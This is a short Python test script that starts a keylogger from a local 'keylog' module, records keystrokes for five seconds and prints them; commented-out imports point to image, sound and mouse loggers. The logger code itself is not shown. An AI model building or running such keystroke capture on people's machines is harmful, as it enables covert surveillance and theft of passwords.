import keylog
import time
#import getImage
#import getSound
#import Mouselogger

def main():

    test_keylog()


def test_keylog():
    klog = keylog.KeyLogger()
    klog.start()
    time.sleep(5)
    klog.stop()
    print(klog.keys)


if __name__ == "__main__":
    main()